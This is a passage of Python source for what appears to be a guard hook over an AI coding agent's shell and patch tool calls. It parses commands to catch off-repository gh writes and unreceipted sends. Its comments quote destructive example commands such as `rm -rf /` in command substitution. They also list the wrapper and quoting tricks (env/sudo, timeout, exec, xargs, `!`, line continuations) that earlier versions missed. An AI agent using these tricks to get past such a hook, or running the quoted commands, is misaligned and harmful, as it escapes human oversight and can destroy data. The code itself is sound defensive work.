        step = abs(int(m[3])) if m[3] and int(m[3]) else 1
        step = step if lo <= hi else -step
        return [chr(v) for v in range(lo, hi + (1 if step > 0 else -1), step)]
    return None


def _brace_group(word, i):
    # i at an unquoted {: (index of its matching }, alternatives), or (None, None) when the
    # braces are not a brace expansion (unmatched, or neither a top-level comma nor a sequence).
    depth, j, n, quote, items, start = 0, i, len(word), "", [], i + 1
    while j < n:
        ch = word[j]
        if ch == "\\" and quote != SQ:
            j += 2
            continue
        if quote:
            if ch == quote:
                quote = ""
        elif ch in (SQ, DQ):
            quote = ch
        elif ch == "$" and word[j + 1:j + 2] == "{":
            j = _skip_param(word, j + 1)
            continue
        elif ch == "{":
            depth += 1
        elif ch == "}":
            depth -= 1
            if depth == 0:
                items.append(word[start:j])
                break
        elif ch == "," and depth == 1:
            items.append(word[start:j])
            start = j + 1
        j += 1
    else:
        return None, None
    if len(items) > 1:
        return j, items
    seq = _seq_items(items[0])
    return (j, seq) if seq is not None else (None, None)


def _brace_word(word, budget):
    # Every word one word expands to, in bash order (the leftmost group first); [word] when
    # nothing in it expands.
    i, n, quote = 0, len(word), ""
    while i < n:
        ch = word[i]
        if ch == "\\" and quote != SQ:
            i += 2
            continue
        if quote:
            if ch == quote:
                quote = ""
        elif ch in (SQ, DQ):
            quote = ch
        elif ch == "$" and word[i + 1:i + 2] == "{":
            i = _skip_param(word, i + 1)
            continue
        elif ch == "{":
            end, items = _brace_group(word, i)
            if items is not None:
                out = []
                for item in items:
                    for rest in _brace_word(item + word[end + 1:], budget):
                        out.append(word[:i] + rest)
                        budget[0] -= 1
                        if len(out) > _BRACE_CAP or budget[0] < 0:
                            raise ValueError("more than %d words from one word" % _BRACE_CAP)
                return out
        i += 1
    return [word]


def _brace_expand_text(text):
    # The command with every unquoted brace expansion written out, word by word. A word ends at
    # what the shell splits on before it expands: a blank, a newline, an operator character or a
    # backtick; quotes are tracked across the word so a quoted blank stays inside it.
    out, i, n, budget, in_test = [], 0, len(text), [_BRACE_TOTAL], False
    while i < n:
        ch = text[i]
        if ch in BLANKS or ch in _BRACE_SEPS:
            out.append(ch)
            i += 1
            continue
        start, quote = i, ""
        while i < n:
            ch = text[i]
            if ch == "\\" and quote != SQ:
                i += 2
                continue
            if quote:
                if ch == quote:
                    quote = ""
            elif ch in (SQ, DQ):
                quote = ch
            elif ch in BLANKS or ch in _BRACE_SEPS:
                break
            i += 1
        word = text[start:min(i, n)]
        if word == "[[":
            in_test = True   # bash performs no brace expansion between [[ and ]]
        elif word == "]]":
            in_test = False
        if "{" in word and "}" in word and not in_test:
            # bash parses before it expands, so a word an expansion produces is a word even when
            # it opens with a comment or operator character; escaped, it stays one here too.
            # An unquoted null word an expansion produces is removed, as bash removes it.
            out.append(" ".join(("\\" + w) if w[0] in _BRACE_WORD_LEADS else w
                                for w in _brace_word(word, budget) if w))
        else:
            out.append(word)
    return "".join(out)


cmd_val = ti.get("command") if (norm_tool == "Bash" and isinstance(ti.get("command"), str)) else (ti.get("cmd") if isinstance(ti.get("cmd"), str) else (ti.get("command") if norm_tool == "Bash" else ""))
raw_command = r(cmd_val)
_BRACE_REFUSAL = None
try:
    raw_command = _brace_expand_text(raw_command)
except ValueError as _brace_err:
    _BRACE_REFUSAL = ("brace expansion of this command is more than the hook reads (%s); "
                      "spell the words out" % _brace_err)


target_paths = []
for _k in ("file_path", "notebook_path", "path", "filePath"):
    _v = ti.get(_k)
    if isinstance(_v, str) and _v:
        target_paths.append(_v)
if isinstance(ti.get("edits"), list):
    for _ed in ti.get("edits"):
        if isinstance(_ed, dict):
            for _k in ("file_path", "path", "filePath"):
                _v = _ed.get(_k)
                if isinstance(_v, str) and _v:
                    target_paths.append(_v)
_patch_blobs = []
for _pk in ("patch", "diff"):
    if isinstance(ti.get(_pk), str):
        _patch_blobs.append(ti.get(_pk))
if raw_tool in ("apply_patch", "patch"):
    for _pk in ("input", "content", "command", "cmd"):
        if isinstance(ti.get(_pk), str):
            _patch_blobs.append(ti.get(_pk))
    if isinstance(d.get("patch"), str):
        _patch_blobs.append(d.get("patch"))
def patch_targets(blob):
    found = []
    for _pln in blob.splitlines():
        _m = re.match(r"^\*\*\* (?:Add|Update|Delete) File:\s*(.+)$", _pln)
        if not _m:
            _m = re.match(r"^\*\*\* Move to:\s*(.+)$", _pln)
        if not _m:
            _m = re.match(r"^(?:\+\+\+|---) (?:[ab]/)?([^\t\r\n]+)", _pln)
        if _m:
            _cand = _m.group(1).strip()
            if _cand and _cand != "/dev/null":
                found.append(_cand)
    return found


for _pv in _patch_blobs:
    target_paths.extend(patch_targets(_pv))
# Line 4 onward: C = comparison command, W = write target, A = literal argument,
# E = an off-repo write with no egress receipt arming it (rule 5, judged here
# because only this side of the protocol still knows the joining operators).
# Paths stay decoded on their own lines; comparison words cannot split operands.
SEND_VERBS = {"create", "merge", "comment", "review", "close", "reopen", "edit",
              "delete", "upload", "ready", "pin", "unpin", "lock", "unlock", "transfer",
              "revert", "update-branch", "develop", "delete-asset"}
# Off-repo writes beyond pr/issue/release (2026-10-23 review, P2-14): each verb changes state
# on the host, so it carries a receipt like any other send. gh secret stays a Never-list ask
# (credential provisioning wants a human grant, not a receipt); gh api is judged by method.
GH_WRITES = {
    "repo": {"create", "delete", "archive", "unarchive", "rename", "edit", "fork", "sync"},
    "workflow": {"run", "enable", "disable"},
    "run": {"cancel", "rerun", "delete"},
    "gist": {"create", "edit", "delete", "rename"},
    "variable": {"set", "delete"},
    "cache": {"delete"},
    "label": {"create", "edit", "delete", "clone"},
    "ssh-key": {"add", "delete"},
    "gpg-key": {"add", "delete"},
    "codespace": {"create", "delete", "edit", "stop", "rebuild"},
    "project": {"create", "delete", "edit", "close", "copy", "link", "unlink", "mark-template",
                "item-add", "item-create", "item-edit", "item-delete", "item-archive",
                "field-create", "field-delete"},
}
# gh persistent flags that take an operand and may sit before the verb: `gh pr -R o/r merge 1`.
_GH_OPERAND_FLAGS = ("-R", "--repo", "--hostname")


# Wrapper words strip_prefix peels on the shell side (env/sudo-style
# laundering). Rule 5 moved into this reader, so the peeling must come with
# it — `env gh issue close`, `command gh release create`, `sudo -n gh …`
# are the same sends (PR #567 review, P1). env/nice/time/nohup also peel
# their own option runs (`env -i gh …` is the canonical form).
_WRAPPERS = {"command", "builtin"}
_WRAPPER_OPERANDS = {
    # -S/--split-string is handled in _peel_wrapper, not here: its operand
    # IS the command, so treating it as a skippable operand would promote
    # the arguments of that command to the head (PR #567 review, P1).
    "env": {"-u", "--unset", "-a", "--argv0", "-C", "--chdir"},
    "nice": {"-n", "--adjustment"},
    "time": {"-o", "--output", "-f", "--format"},
    "nohup": set(),
}
_SUDO_OPERAND_FLAGS = ("-u", "-U", "-g", "-h", "-p", "-C", "-T", "-R", "-t")


def _split_env_string(text):
    # GNU coreutils env invocation: split-string syntax is not shell syntax.
    # In particular, \c stops argv and \_ separates words only outside quotes.
    # Environment expansion depends on the future command environment, so refuse
    # it rather than invent argv that could falsely prove a receipt (#567).
    words, cur, quote = [], [], ""
    started = False  # a quote opens a word even if it adds no characters:
    # `""` is an empty argument env preserves and python consumes (P1).
    i = 0

    def flush():
        nonlocal cur, started
        if started:
            words.append("".join(cur))
            cur, started = [], False

    while i < len(text):
        ch = text[i]
        if ch == "\\":
            if i + 1 == len(text):
                raise ValueError("env -S ends in a backslash")
            nxt = text[i + 1]
            if quote == SQ and nxt not in (SQ, "\\"):
                cur.append(ch)
                started = True
                i += 1
                continue
            if nxt == "c":
                if quote:
                    raise ValueError("env -S has a quoted stop escape")
                break
            if nxt == "_" and not quote:
                flush()
            else:
                escapes = {"f": chr(12), "n": chr(10), "r": chr(13),
                           "t": chr(9), "v": chr(11), "_": " ",
                           "#": "#", "$": "$", DQ: DQ, SQ: SQ, "\\": "\\"}
                if nxt not in escapes:
                    raise ValueError("unsupported env -S escape")
                cur.append(escapes[nxt])
                started = True
            i += 2
            continue
        if ch == quote:
            quote = ""
        elif not quote and ch in (SQ, DQ):
            quote = ch
            started = True
        elif quote != SQ and ch == "$":
            raise ValueError("env -S environment expansion cannot prove a receipt")
        elif not quote and ch == "#" and not started:
            break
        elif not quote and ch in " \t\n\r\v\f":
            flush()
        else:
            cur.append(ch)
            started = True
        i += 1
    if quote:
        raise ValueError("unclosed env -S quote")
    flush()
    return words


def _peel_wrapper(ws, operand_flags, is_env=False):
    # ws[0] is env/nice/time/nohup: peel it and its options. Help/version
    # means nothing runs — return the words as they stand.
    original = ws
    ws = ws[1:]
    while ws:
        word = ws[0]
        if word in ("-V", "--help", "--version"):
            return original
        if word == "--":
            return ws[1:]
        if is_env and word in ("-S", "--split-string") and len(ws) > 1:
            # The operand IS the command line env runs: its words take the
            # head, the words after it become their arguments. env processes
            # options in the expanded argv too, before selecting its command.
            ws = _split_env_string(ws[1]) + ws[2:]
            continue
        if is_env and word.startswith("--split-string="):
            ws = _split_env_string(word.split("=", 1)[1]) + ws[1:]
            continue
        if is_env and word.startswith("-S") and len(word) > 2:
            ws = _split_env_string(word[2:]) + ws[1:]
            continue
        if word in operand_flags and len(ws) > 1:
            ws = ws[2:]
        elif is_env and word.startswith("-"):
            # Unknown clusters/abbreviations can contain another -S or an
            # early-exit option: declining to infer them must fail closed.
            if word not in ("-", "-i", "--ignore-environment", "-v", "--debug") \
                    and not any(word.startswith(flag + "=") for flag in operand_flags
                                if flag.startswith("--")):
                raise ValueError("unsupported env option")
            ws = ws[1:]
        elif word.startswith("-"):
            ws = ws[1:]  # a lone "-" is env spelling of -i; no command is "-"
        else:
            return ws
    return ws


def _peel_sudo(ws):
    # ws[0] is sudo: peel it, stacked sudos, and the sudo option run —
    # the same shapes strip_prefix handles (`sudo -n`, `sudo --`,
    # `sudo -u root`, `sudo --user=root`). A help/version option stops the
    # peel cold: sudo prints and exits 0 running nothing, so the words keep
    # their sudo head and neither arm a receipt nor read as the send.
    original = ws
    ws = ws[1:]
    while ws:
        word = ws[0]
        if word in ("-V", "--help", "--version"):
            return original
        if word == "sudo":
            ws = ws[1:]
        elif word == "--":
            return ws[1:]
        elif word.startswith("--") and "=" in word:
            ws = ws[1:]
        elif word in _SUDO_OPERAND_FLAGS and len(ws) > 1:
            ws = ws[2:]
        elif word.startswith("-") and word != "-":
            ws = ws[1:]
        else:
            return ws
    return ws


# Launchers that run their operands as a command, beyond the env/sudo family: (short options
# taking an operand, long options taking one, operands before the command: the timeout
# DURATION, the taskset MASK, the chrt PRIORITY). The HIGH tier anchored at a segment head
# that only the env/sudo family was peeled from, so `timeout 30 git push --force origin main`,
# `exec …`, `setsid …` and `xargs …` were allowed, and rule 5 never saw `timeout 5 gh pr merge`
# (2026-10-23 review, P1-3, P2-13). A --help/--version word means nothing runs.
_LAUNCHERS = {
    "timeout": ("sk", ("--signal", "--kill-after"), 1),
    "stdbuf": ("ioe", ("--input", "--output", "--error"), 0),
    "ionice": ("cnpPu", ("--class", "--classdata", "--pid", "--pgid", "--uid"), 0),
    "chrt": ("TPD", ("--sched-runtime", "--sched-period", "--sched-deadline"), 1),
    "taskset": ("", (), 1),
    "doas": ("auC", (), 0),
    "setsid": ("", (), 0),
    "exec": ("a", (), 0),
    "xargs": ("adEILnPsJRS", ("--arg-file", "--delimiter", "--max-args", "--max-procs",
                              "--max-chars", "--process-slot-var"), 0),
    # #598: launchers that run their operands as a command vector. chroot takes NEWROOT
    # first; the util-linux and strace option operands are their separate-word forms.
    "chroot": ("", ("--userspec", "--groups"), 1),
    "unshare": ("SGRw", ("--setuid", "--setgid", "--root", "--wd", "--propagation",
                         "--setgroups", "--map-user", "--map-group", "--map-users",
                         "--map-groups"), 0),
    "nsenter": ("tSG", ("--target", "--setuid", "--setgid"), 0),
    "strace": ("eopsuEabIOPSXU", ("--output", "--attach", "--string-limit", "--user", "--env",
                                   "--columns", "--trace-path", "--summary-sort-by", "--signal",
                                   "--status", "--trace", "--abbrev", "--verbose", "--raw",
                                   "--read", "--write", "--inject", "--fault", "--quiet",
                                   "--decode-fds"), 0),
}
# A receipt must report the writer exit status to &&: setsid may fork and return at once,
# xargs may run nothing at all, and exec never returns, so none of them can arm a send.
_RECEIPT_LAUNCHERS = ("timeout", "stdbuf", "ionice", "chrt", "taskset", "doas")
# Reserved words that open a command without being one: `if git push -f …; then …`.
_KEYWORDS = ("if", "then", "elif", "else", "do", "while", "until")


def _peel_launcher(ws, short_arg, long_arg, positional):
    original, ws = ws, ws[1:]
    while ws:
        word = ws[0]
        if word in ("--help", "--version"):
            return original
        if word == "--":
            ws = ws[1:]
            break
        if word.startswith("--"):
            name = word.split("=", 1)[0]
            takes = "=" not in word and len(name) > 2 and any(o.startswith(name) for o in long_arg)
            ws = ws[2:] if takes else ws[1:]
        elif word.startswith("-") and len(word) > 1:
            used = 1
            for k, flag in enumerate(word[1:]):
                if flag in short_arg:
                    used = 2 if k == len(word) - 2 else 1
                    break
            ws = ws[used:]
        else:
            break
    return ws[positional:]


def _plain_words(args, peel_bang=True, extended=False, assigns=None):
    # extended: also peel the launcher table, reserved words, case patterns and function
    # heads, by basename (`/usr/bin/timeout`). The default keeps the original peel, which
    # the bracket lexer relies on; "receipt" peels only exit-status-preserving launchers.
    ws = list(args)
    while ws:
        # Group/subshell openers and negation name no command: `{ gh …; }`,
        # `(gh …)`, `! gh …` run the same command (PR #567 review, P1).
        # Peel the opener word, or the opener character glued to it. The
        # receipt check passes peel_bang=False: `!` inverts exit status, so
        # a negated writer that FAILS reads as success to `&&` — it proves
        # nothing was recorded and must never arm a send (P1).
        openers = ("{", "(", "!") if peel_bang else ("{", "(")
        head = ws[0].rsplit("/", 1)[-1] if extended else ws[0]
        if ws[0] in openers:
            ws = ws[1:]
        elif ws[0][:1] in openers and len(ws[0]) > 1:
            ws = [ws[0][1:]] + ws[1:]
        elif re.fullmatch(r"[A-Za-z_][A-Za-z0-9_]*=.*", ws[0], re.DOTALL):
            if assigns is not None:
                assigns.append(ws[0])
            ws = ws[1:]
        elif head == "sudo":
            peeled = _peel_sudo(ws)
            if peeled == ws:
                return ws  # help/version stop: judge the words as they stand
            ws = peeled
        elif head in _WRAPPER_OPERANDS:
            peeled = _peel_wrapper(ws, _WRAPPER_OPERANDS[head],
                                   is_env=head == "env")
            if peeled == ws:
                return ws
            ws = peeled
        elif head in _WRAPPERS:
            if extended and len(ws) > 1 and ws[1] in ("-v", "-V"):
                return ws  # command -v prints a path and runs nothing
            ws = ws[2:] if extended and ws[1:2] == ["-p"] else ws[1:]
        elif extended and head in _LAUNCHERS \
                and (extended != "receipt" or head in _RECEIPT_LAUNCHERS):
            peeled = _peel_launcher(ws, *_LAUNCHERS[head])
            if peeled is ws:
                return ws
            ws = peeled
        elif extended and head in _KEYWORDS:
            ws = ws[1:]
        elif extended and head == "case":
            ws = ws[3:]  # case WORD in: the pattern) that follows is peeled next
        elif extended and head == "coproc":
            ws = ws[2:] if len(ws) > 2 and ws[2][:1] in ("{", "(") else ws[1:]
        elif extended and head == "function" and len(ws) > 1:
            ws = ws[2:]
        elif extended and ws[1:2] == ["()"]:
            ws = ws[2:]  # NAME () { …: the body is judged as if called
        elif extended and re.fullmatch(r"[A-Za-z_][A-Za-z0-9_.:-]*\(\)\{", ws[0]):
            ws = ws[1:]  # NAME(){ glued to its brace opens the same body (PR #648 review sweep)
        elif extended and len(ws[0]) > 1 and ws[0].endswith(")") \
                and (ws[0].endswith("()") or "(" not in ws[0]):
            ws = ws[1:]  # a case-arm pattern word or a NAME() head names no command
        else:
            return ws
    return ws


def _command_words(args, assigns=None):
    """The command a segment runs, every wrapper the shell or a launcher adds peeled off.

    The one peeler: the HIGH tier, the never list, rule 5, the tee boundary and the
    self-guard all judge these words (2026-10-23 review, P1-3). Leading NAME=value words are
    collected into assigns when given, so GIT_DIR= still redirects a push for the tier.
    """
    ws = list(args)
    if ws and ws[-1].endswith(")"):
        last = ws[-1].rstrip(")")  # a subshell close glued to the last word
        ws = ws[:-1] + ([last] if last else [])
    return _peel_shell(_plain_words(ws, extended=True, assigns=assigns))   # F2: busybox sh


def _is_receipt(args):
    # The receipt writer must be the command being run — egress.py as the
    # executable, or as the script a python invocation runs. Merely
    # MENTIONING it (`echo egress.py write`) records nothing and arms
    # nothing (PR #567 review, P1).
    ws = _plain_words(args, peel_bang=False, extended="receipt")
    def is_egress(word):
        return word == "egress.py" or word.endswith("/egress.py")

    if len(ws) >= 2 and is_egress(ws[0]) and ws[1] == "write":
        return True
    # python3 [options] … egress.py write: versioned interpreters
    # (python3.12) and interpreter options before the script still run the
    # writer (PR #567 review, P2). The options are ALLOWLISTED to ones that
    # proceed to the script — --version/-h print and exit 0 without running
    # it, so skipping unknown dash-words would arm a send on a no-op (P1).
    if ws and re.fullmatch(r"python(3(\.\d+)?)?", ws[0].rsplit("/", 1)[-1]):
        i = 1
        while i < len(ws):
            word = ws[i]
            if word == "--":
                i += 1
                break
            if word in ("-W", "-X"):
                i += 2
            elif re.fullmatch(r"-[WX].+", word, re.DOTALL):
                i += 1
            elif re.fullmatch(r"-[uEIsSvqBObdi]+", word):
                i += 1
            else:
                break
        return i < len(ws) and not ws[i].startswith("-") \
            and i + 1 < len(ws) and is_egress(ws[i]) and ws[i + 1] == "write"
    return False


def _is_send(args):
    ws = _command_words(args)
    if not ws or not (ws[0] == "gh" or ws[0].endswith("/gh")):
        return False
    rest, i = ws[1:], 0
    while i < len(rest) and rest[i].startswith("-"):
        i += 2 if rest[i] in _GH_OPERAND_FLAGS else 1
    if i >= len(rest):
        return False
    group, tail = rest[i], rest[i + 1:]
    if group == "api":
        method, fields, i = None, False, 0
        while i < len(tail):
            word = tail[i]
            if word in ("-X", "--method") and i + 1 < len(tail):
                method = tail[i + 1].upper()
                i += 2
                continue
            if word.startswith("--method="):
                method = word.split("=", 1)[1].upper()
            elif word.startswith("-X") and len(word) > 2:
                method = word[2:].upper()
            elif word in ("-f", "-F", "--field", "--raw-field", "--input") \
                    or word.startswith(("--field=", "--raw-field=", "--input=")) \
                    or (len(word) > 2 and word[:2] in ("-f", "-F")):
                # Attached short forms (-ftitle=x) supply fields too, and so
                # imply POST with no explicit method (PR #567 review, P1).
                fields = True
            i += 1
        # An explicit method wins: --method GET with -f filters is a read.
        # Fields imply POST only when no method was supplied (gh semantics).
        if method is not None:
            return method in ("POST", "PUT", "PATCH", "DELETE")
        return fields
    # The verb is the first word after the group that is not a flag (a persistent -R/--repo
    # and its operand may sit between them).
    verbs, i = [], 0
    while i < len(tail) and len(verbs) < 2:
        if tail[i] in _GH_OPERAND_FLAGS:
            i += 2
            continue
        if not tail[i].startswith("-"):
            verbs.append(tail[i])
        i += 1
    if not verbs:
        return False
    if group in ("pr", "issue", "release"):
        return verbs[0] in SEND_VERBS
    if group == "repo" and verbs[0] in ("deploy-key", "autolink"):
        return verbs[1:2] in (["add"], ["create"], ["delete"])
    return verbs[0] in GH_WRITES.get(group, ())


def _balanced_paren_end(text, j):
    # Use the same lexical walk as command judgment: quotes, comments, arithmetic
    # and heredoc data cannot close a surrounding command/process substitution.
    end, closed = substitution_bodies(text[j:], _stop_paren=True)
    return j + end, closed


def _join_continuations(text):
    # Delete line continuations the way the shell does: each backslash pairs with the next
    # character, so an ESCAPED backslash (two before a newline) leaves a literal backslash
    # and a real newline -- a blanket replace joined those lines and hid what followed.
    out, i, n = [], 0, len(text)
    while i < n:
        if text[i] == chr(92):
            if text[i + 1:i + 2] != chr(10):
                out.append(text[i:i + 2])
            i += 2
            continue
        out.append(text[i])
        i += 1
    return "".join(out)


def _backtick_body(raw, in_dq=False):
    # Inside `...` a backslash keeps its literal meaning EXCEPT before $, a backtick or a
    # backslash (and, within double quotes, a double quote), where the shell removes it before
    # the body runs. Keeping it hid the nested command in echo `echo \`cmd\`` (#598 corpus).
    return re.sub(r"\\([$`\\" + (DQ if in_dq else "") + r"])", r"\1", raw)


def _heredoc_body_subs(body):
    # An UNQUOTED heredoc body expands $(...) and `...` with quotes LITERAL: a single-quoted
    # "$(cmd)" there still runs cmd. Process substitution <(...) is plain text in a body.
    body = _join_continuations(body)  # line continuation applies in an unquoted body
    out, i, n = [], 0, len(body)
    while i < n:
        ch = body[i]
        if ch == chr(92):
            i += 2
            continue
        if ch == chr(96):
            j = i + 1
            while j < n and body[j] != chr(96):
                j += 2 if body[j] == chr(92) else 1
            out.append(_backtick_body(body[i + 1:j]))
            i = j + 1
            continue
        if ch == "$" and body[i + 1:i + 2] == "(" and body[i + 2:i + 3] != "(":
            j, closed = _balanced_paren_end(body, i + 2)
            out.append(body[i + 2:j - 1] if closed else body[i + 2:])
            i = j
            continue
        i += 1
    return out


def _heredoc_delim(text, i):
    # Called only at a lexically active <<. Parse its one quote-removed WORD;
    # nested substitutions and arithmetic are handled by the caller, never rescanned.
    j = i + 2
    dash = text[j:j + 1] == "-"
    j += 1 if dash else 0
    while j < len(text) and (text[j] in BLANKS or text[j:j + 2] == "\\\n"):
        j += 2 if text[j:j + 2] == "\\\n" else 1
    k, parts, quoted, started = j, [], False, False
    while k < len(text):
        ch = text[k]
        if ch == SQ:
            end = text.find(SQ, k + 1)
            if end < 0:
                raise ValueError("unclosed heredoc delimiter quote")
            parts.append(text[k + 1:end])
            quoted, started, k = True, True, end + 1
        elif ch == DQ:
            end, buf = k + 1, []
            while end < len(text) and text[end] != DQ:
                if text[end:end + 2] == "\\\n":
                    end += 2
                    continue
                if text[end] == chr(92) and text[end + 1:end + 2] in (DQ, chr(92), "$", chr(96)):
                    end += 1
                buf.append(text[end])
                end += 1
            if end == len(text):
                raise ValueError("unclosed heredoc delimiter quote")
            parts.append("".join(buf))
            quoted, started, k = True, True, end + 1
        elif ch == chr(92):
            if k + 1 == len(text):
                raise ValueError("incomplete heredoc delimiter escape")
            if text[k + 1] != chr(10):
                parts.append(text[k + 1])
                quoted, started = True, True
            k += 2
        elif ch in BLANKS + chr(10) + ";|&<>()":
            if ch == "(" and text[k - 1:k] == "$":
                raise ValueError("unsupported heredoc delimiter word")
            break
        elif ch == chr(96):
            raise ValueError("unsupported heredoc delimiter word")
        else:
            parts.append(ch)
            started, k = True, k + 1
    delim = "".join(parts)
    if not started or chr(10) in delim:
        raise ValueError("unsupported heredoc delimiter word")
    return (delim, quoted, dash), k


def _bracket_expression(prefix, text, i):
    # A literal argument [ is not an arithmetic scope. Inspect the current
    # command words, using the already sanitized outer surface for substitutions.
    marker, args, pending = "__orca_bracket__", [], False
    seg = _split(prefix + marker)[-1][1]
    for kind, value in shell_tokens(seg):
        if kind == "redirect":
            pending = True
        elif pending:
            if value.endswith(marker):
                return ""
            pending = False
        else:
            args.append(value)
    partial = args.pop()[:-len(marker)]
    if partial:
        args.append(partial)
    words = _plain_words(args)
    keywords = {"if", "then", "elif", "else", "while", "until", "do", "!"}
    if not partial and text.startswith("[[", i) and all(word in keywords for word in words):
        return "conditional"
    name = r"[A-Za-z_][A-Za-z0-9_]*"
    def assignment_context(before):
        before = _plain_words(before)
        while before and before[0] in keywords:
            before = _plain_words(before[1:])
        if before and re.fullmatch(name + r"\(\)", before[0]):
            before = _plain_words(before[1:])
        if before and before[0] in ("declare", "typeset", "readonly", "local"):
            return all(word.startswith("-") for word in before[1:])
        return not before

    # Compound assignments put the element index after NAME=( or NAME+=(,
    # possibly following earlier elements. Their << is an arithmetic shift.
    compound = any(re.match(name + r"\+?=\(", word) and assignment_context(args[:j])
                   for j, word in enumerate(args))
    if ((partial and words == [partial] and re.fullmatch(name, partial)) or compound) \
            and re.search(r"\]\+?=", text[i:]):
        return "array"
    return ""


def _brace_end(text, j):
    # Index just past the } that closes a ${ cmd; } body starting at j (len(text) if none):
    # quotes and escapes hide braces, nested { } balance.
    depth, quote = 1, ""
    while j < len(text):
        ch = text[j]
        if ch == chr(92) and quote != SQ:
            j += 2
            continue
        if quote:
            quote = "" if ch == quote else quote
        elif ch in (SQ, DQ):
            quote = ch
        elif ch in "{}":
            depth += 1 if ch == "{" else -1
            if not depth:
                return j + 1
        j += 1
    return len(text)


def substitution_bodies(text, depth=0, _stop_paren=False, flat=True):
    # Command substitution runs its body as a command BEFORE the outer word is used:
    # `echo $(rm -rf /)`, `x=\`rm -rf /\``, `diff <(curl ...) f` and $(...) inside an
    # unquoted heredoc all execute, yet no segment of the outer line names them (#592
    # review). Return every such body (nested ones too) so each is judged as a command.
    # Text that never runs is NOT scanned: single-quoted words, `# comments`, contexts
    # $((...)), and the body of a heredoc whose delimiter is quoted (<<"EOF", <<\EOF) --
    # so documentation and fixtures that QUOTE a shell example stay writable. Return
    # the command surface without heredoc bodies, plus patch bodies for target checks,
    # plus each heredoc with the opener text around it. flat=False returns each body RAW and
    # only the heredocs of this text, in the order their << appear (_flow reads each body
    # with its own heredocs, PR #648 review).
    out, i, n, in_sq, in_dq = [], 0, len(text), False, False
    ansi = False   # inside $<SQ>...<SQ>, where a backslash escapes the quote (P2-10)
    source_length, paren_level = n, 1
    # Continuations normalize the scanned text; boundary callers need an index
    # into their original text. Retain the position of each surviving character.
    positions = list(range(n)) if _stop_paren else None
    line_start = surface_start = 0
    surface, patches, pending, contexts = [], [], [], []
    docs = []   # (opener text before <<, opener text after its word, body): see _fed_code
    brackets, bracket_kind = 0, ""
    case_depth = 0   # open case statements while looking for the end of a substitution
    while i < n:
        ch = text[i]
        if not in_sq and ch in "$(<>":
            # Remove continuations within an opener before deciding its context:
            # $(\<newline>( is arithmetic, and (\<newline>( opens (( too.
            end, spelling, spelling_positions = i, [], []
            while end < n and len(spelling) < 3 and text[end] not in (SQ, DQ, chr(96), chr(10)):
                if text[end:end + 2] == "\\\n":
                    end += 2
                    continue
                if text[end] == chr(92):
                    break
                spelling.append(text[end])
                if _stop_paren:
                    spelling_positions.append(positions[end])
                end += 1
            if end - i > len(spelling):
                text = text[:i] + "".join(spelling) + text[end:]
                if _stop_paren:
                    positions = positions[:i] + spelling_positions + positions[end:]
                n, ch = len(text), text[i]
        if ch == chr(10) and not (in_sq or in_dq or contexts):
            # Consume only redirections queued by this lexical walk. A raw opener
            # rescan would re-open inner heredocs after their substitution has closed.
            opener = text[line_start:i]
            if pending:
                surface.append(text[surface_start:i + 1])
            is_patch = re.search(r"(^|[^A-Za-z0-9_./-])(apply_patch|applypatch)([^A-Za-z0-9_-]|$)", opener)
            line_end = i
            i += 1
            for (delim, quoted, dash), op_start, op_end in pending:
                body_start = i
                while i <= n:
                    nl = text.find(chr(10), i)
                    end = n if nl < 0 else nl
                    line = text[i:end]
                    if not quoted:
                        # A continued physical line is joined BEFORE delimiter matching.
                        # EO\<newline>F closes EOF; text after it is executable shell.
                        while nl >= 0 and (len(line) - len(line.rstrip(chr(92)))) % 2:
                            nl = text.find(chr(10), end + 1)
                            end = n if nl < 0 else nl
                            line = text[i:end]
                        line = _join_continuations(line)
                    bare = line.lstrip(chr(9)) if dash else line
                    if bare == delim:
                        body = text[body_start:i]
                        i = end + 1
                        break
                    if (_stop_paren or depth) and delim and ")" not in delim and bare.startswith(delim) \
                            and bare[len(delim):].strip(BLANKS)[:1] == ")":
                        # Inside a substitution bash 3.2 ends the body at DELIM) and the paren
                        # closes the substitution too, so text after it runs (#598 corpus); a
                        # reading that kept the body open let that text through. Refuse it.
                        raise ValueError("a heredoc delimiter that also closes its substitution")
                    if nl < 0:
                        body, i = text[body_start:], n
                        break
                    i = nl + 1
                if dash:
                    body = chr(10).join(line.lstrip(chr(9)) for line in body.split(chr(10)))
                if is_patch:
                    patches.append(body)
                if not quoted and not _stop_paren:
                    out += _heredoc_body_subs(body)
                if not _stop_paren:
                    docs.append((text[line_start:op_start], text[op_end:line_end],
                                 body if quoted else _join_continuations(body)))
            if pending:
                surface_start = i
            pending = []
            line_start = i
            continue
        if ch == chr(92) and not in_sq and text[i + 1:i + 2] == chr(10):
            # Line continuation: the shell deletes backslash-newline BEFORE splitting words,
            # so `a\<newline>#$(cmd)` is the single word `a#$(cmd)` and cmd runs. Delete the
            # pair from the stream (bodies of heredocs are consumed separately, untouched).
            text = text[:i] + text[i + 2:]
            if _stop_paren:
                positions = positions[:i] + positions[i + 2:]
            n = len(text)
            # `$\<newline>(cmd)` joins into `$(cmd)`: re-read a substitution opener that sat
            # just before the continuation (no quote char is re-read, so state is unchanged).
            # An ESCAPED opener (`\$\<newline>(` prints a literal example) stays literal:
            # an odd run of backslashes right before it means it was escaped (#592 review).
            if i > 0 and text[i - 1] in "$<>":
                k = i - 1
                while k > 0 and text[k - 1] == chr(92):
                    k -= 1
                if (i - 1 - k) % 2 == 0:
                    i -= 1
            continue
        if ch == chr(92) and (not in_sq or ansi):
            i += 2
            continue
        param = contexts[-1][5] if contexts and contexts[-1][0] == "{" else None
        if param and param["mode"] is None and not (in_sq or in_dq):
            if ch == "[":
                param["brackets"] += 1
            elif ch == "]":
                param["brackets"] = max(0, param["brackets"] - 1)
            elif not param["brackets"]:
                end = i + 1
                while text[end:end + 2] == "\\\n":
                    end += 2
                if param["name"] and ch in "-+=?:#%/^,":
                    param["mode"] = "default" if ch in "-+=?" or (ch == ":" and text[end:end + 1] in "-+=?" and end < n) else "pattern"
                param["name"] = True
        param_quoted = bool(param and param["quoted"] and param["mode"] == "default")
        if _stop_paren and ch in "ce" and not (in_sq or in_dq or contexts):
            # A case pattern closes with a bare ")" that does NOT end the substitution:
            # $(case x in x) cmd;; esac) runs cmd in bash 4 and later (#598 corpus; bash 3.2
            # calls it a syntax error). Only a case or esac in command position counts.
            word = re.match(r"(case|esac)(?=[ \t\n;&|)]|$)", text[i:])
            before = text[:i].rstrip(BLANKS)
            if word and (not before or before[-1] in ";&|({" + chr(10) or re.search(
                    r"(^|[^A-Za-z0-9_])(then|do|else|elif|if|while|until|!)$", before)):
                case_depth = case_depth + 1 if word[1] == "case" else max(0, case_depth - 1)
